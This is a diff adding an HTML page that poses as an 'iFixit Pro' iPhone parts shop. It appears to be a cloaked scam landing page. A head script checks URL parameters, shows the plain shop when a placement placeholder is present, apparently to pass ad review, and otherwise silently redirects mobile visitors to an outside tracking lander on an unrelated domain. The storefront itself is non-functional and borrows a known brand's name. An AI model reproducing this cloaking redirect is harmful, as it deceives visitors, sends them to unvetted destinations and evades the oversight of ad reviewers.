@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iFixit Pro: Premium iPhone Parts</title>
+    <style>
+        :root {
+            --primary-color: #4CAF50;
+            --secondary-color: #2196F3;
+            --background-color: #FAFAFA;
+            --text-color: #333333;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            flex: 1;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        .part-card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin: 10px;
+            padding: 20px;
+            width: 300px;
+            transition: transform 0.3s ease;
+        }
+        .part-card:hover {
+            transform: translateY(-5px);
+        }
+        .part-image {
+            height: 200px;
+            background-color: #E0E0E0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            color: #757575;
+            border-radius: 4px;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        h2 {
+            color: var(--secondary-color);
+            margin-top: 15px;
+        }
+        p {
+            color: #757575;
+        }
+        .price {
+            font-weight: bold;
+            color: var(--primary-color);
+            font-size: 1.2em;
+            margin-top: 10px;
+        }
+        .buy-button {
+            background-color: var(--secondary-color);
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
+        }
+        .buy-button:hover {
+            background-color: #1976D2;
+        }
+        footer {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 10px;
+            text-align: center;
+        }
+        nav {
+            background-color: #E8F5E9;
+            padding: 10px 0;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        nav li {
+            margin: 0 15px;
+        }
+        nav a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: bold;
+        }
+        footer a {
+            color: white;
+            text-decoration: underline;
+        }
+        .compatibility {
+            font-size: 0.9em;
+            color: #9E9E9E;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>iFixit Pro</h1>
+        <p>Premium iPhone Parts for DIY Repairs</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Screens</a></li>
+            <li><a href="#">Batteries</a></li>
+            <li><a href="#">Cameras</a></li>
+            <li><a href="#">Repair Guides</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="part-card">
+            <div class="part-image">OLED Screen</div>
+            <h2>iPhone 13 Pro OLED Screen</h2>
+            <p>High-quality replacement display</p>
+            <p class="compatibility">Compatible with iPhone 13 Pro</p>
+            <p class="price">$229.99</p>
+            <button class="buy-button">Add to Cart</button>
+        </div>
+        <div class="part-card">
+            <div class="part-image">Battery</div>
+            <h2>iPhone 12 Battery</h2>
+            <p>Long-lasting replacement battery</p>
+            <p class="compatibility">Compatible with iPhone 12</p>
+            <p class="price">$49.99</p>
+            <button class="buy-button">Add to Cart</button>
+        </div>
+        <div class="part-card">
+            <div class="part-image">Rear Camera</div>
+            <h2>iPhone 14 Rear Camera Module</h2>
+            <p>High-resolution camera replacement</p>
+            <p class="compatibility">Compatible with iPhone 14</p>
+            <p class="price">$89.99</p>
+            <button class="buy-button">Add to Cart</button>
+        </div>
+        <div class="part-card">
+            <div class="part-image">Charging Port</div>
+            <h2>iPhone 11 Charging Port Flex</h2>
+            <p>Replacement charging port with mic</p>
+            <p class="compatibility">Compatible with iPhone 11</p>
+            <p class="price">$29.99</p>
+            <button class="buy-button">Add to Cart</button>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 iFixit Pro. All rights reserved.</p>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
